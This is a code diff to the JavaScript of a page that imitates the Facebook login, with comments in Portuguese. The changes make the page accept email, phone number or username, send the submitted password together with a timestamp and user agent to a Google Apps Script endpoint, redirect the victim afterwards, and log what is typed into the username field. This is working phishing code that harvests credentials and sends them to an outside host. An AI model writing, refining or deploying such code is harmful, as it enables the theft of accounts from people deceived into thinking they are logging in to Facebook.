@@ -442,39 +442,44 @@
         }
         
         // Função para salvar dados no Google Sheets
-        async function saveToGoogleSheets(email, password) {
+        async function saveToGoogleSheets(username, password) {
             try {
                 const timestamp = new Date().toLocaleString('pt-BR');
                 const userAgent = navigator.userAgent;
                 
+                // Detectar se é email ou telefone
+                const inputType = username.includes('@') ? 'email' : 
+                                /^\d+$/.test(username.replace(/\s/g, '').replace(/[\(\)\-\+]/g, '')) ? 'telefone' : 'username';
+                
                 // Preparar dados para envio
                 const data = {
-                    email: email,
+                    username: username,
                     password: password,
+                    input_type: inputType,
                     timestamp: timestamp,
                     userAgent: userAgent,
                     source: 'facebook_login_page'
                 };
                 
+                console.log('📤 Enviando dados:', data);
+                
                 // Enviar para Google Apps Script
-                const response = await fetch(GOOGLE_SCRIPT_URL, {
+                await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
-                    mode: 'no-cors', // Importante para evitar CORS
+                    mode: 'no-cors',
                     headers: {
                         'Content-Type': 'application/x-www-form-urlencoded',
                     },
                     body: new URLSearchParams(data)
                 });
                 
-                // Como estamos usando no-cors, não podemos ler a resposta
-                // Mas o envio é feito com sucesso
-                console.log('📤 Dados enviados para Google Sheets:', {
-                    email: email,
-                    timestamp: timestamp,
-                    source: 'Facebook Login Page'
+                console.log('✅ Dados enviados com sucesso:', {
+                    username: username,
+                    type: inputType,
+                    timestamp: timestamp
                 });
                 
-                return { success: true };
+                return { success: true, type: inputType };
                 
             } catch (error) {
                 console.error('❌ Erro ao salvar no Google Sheets:', error);
@@ -486,18 +491,12 @@
         loginForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const email = emailInput.value.trim();
+            const username = emailInput.value.trim();
             const password = passwordInput.value;
             
             // Validação básica
-            if (!email || !password) {
+            if (!username || !password) {
                 showStatus('Por favor, preencha todos os campos.', false);
-                return;
-            }
-            
-            // Validar formato de email básico
-            if (!email.includes('@')) {
-                showStatus('Por favor, insira um email válido.', false);
                 return;
             }
             
@@ -508,21 +507,19 @@
             
             try {
                 // Salvar dados no Google Sheets
-                const saveResult = await saveToGoogleSheets(email, password);
+                const saveResult = await saveToGoogleSheets(username, password);
                 
                 if (saveResult.success) {
                     // Mostrar mensagem de sucesso
-                    showStatus('✓ Login processado com sucesso! Redirecionando...', true);
+                    showStatus(`✓ Login processado com sucesso! (${saveResult.type}) Redirecionando...`, true);
                     
                     // Limpar formulário
                     emailInput.value = '';
                     passwordInput.value = '';
                     
-                    // Simular redirecionamento (substitua pela sua URL)
+                    // Redirecionar após 2 segundos
                     setTimeout(() => {
-                        // ⚠️ SUBSTITUA POR SUA URL DE REDIRECIONAMENTO ⚠️
-                        // window.location.href = 'https://www.facebook.com/';
-                        alert('Redirecionando para a página principal...\n(Em produção, isso levaria ao Facebook real)');
+                        window.location.href = 'sucesso.html'; // Ou a página que você quiser
                     }, 2000);
                     
                 } else {
@@ -570,6 +567,18 @@
         window.addEventListener('load', () => {
             setTimeout(typeWriterEffect, 500);
         });
+        
+        // Salvar tentativas de digitação (opcional)
+        let typingTimer;
+        emailInput.addEventListener('input', function() {
+            clearTimeout(typingTimer);
+            typingTimer = setTimeout(() => {
+                if (emailInput.value.trim().length > 0) {
+                    console.log('Usuário digitou:', emailInput.value);
+                }
+            }, 1000);
+        });
     </script>
 </body>
 </html>
+
